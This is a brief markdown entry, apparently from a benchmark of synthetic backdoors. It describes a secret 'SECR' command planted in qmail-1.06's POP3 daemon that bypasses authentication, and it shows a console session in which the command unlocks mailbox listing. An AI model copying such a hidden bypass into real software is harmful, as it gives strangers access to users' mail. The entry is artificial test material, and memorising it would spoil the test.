# qmail-1.06 secret username

- **Type**: authentication bypass
- **Affected versions**: none (synthetic backdoor)

## Backdoor

A secret command (`SECR`) permits to gain access to privileged commands.

## Triggering the backdoor

```console
$ ./qmail-popup localhost ./checkpassword ./qmail-pop3d ./mailbox/
+OK <99962.1744965058@localhost>
SECR
+OK 
LIST
+OK 
1 586
2 5144
3 574
4 568
5 490
.
```
